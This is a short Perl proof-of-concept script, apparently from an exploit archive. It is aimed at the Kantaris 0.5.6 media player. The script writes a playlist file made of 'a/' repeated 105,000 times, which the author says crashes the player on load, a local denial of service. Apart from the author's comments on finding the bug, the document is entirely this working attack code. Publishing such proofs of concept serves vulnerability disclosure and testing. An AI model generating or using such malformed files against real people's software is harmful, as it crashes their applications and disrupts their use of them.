#!/usr/bin/perl
#Kantaris 0.5.6 local Denial of service Poc
#
#
#Author: Teo Manojlovic
#
#How i find this bug: I was looking for mkv player because i downloaded 13 seasons
#of south park. I found Kantaris player and decided to chek it's security.
#
#
#
#
#
#Bug info:Kantaris 0.5.6 crashes while loading poc playlist.Loading  that kind of playlist
#should be possible and is possible on other media players.
#
#
#
#
#
#
#
#Here is Proof on concept.........
 
 
$file="poc.m3u";
$poc='a/' x 105000;
open(myfile,">>$file");
print myfile $poc;
close(myfile);
print "Finished\n";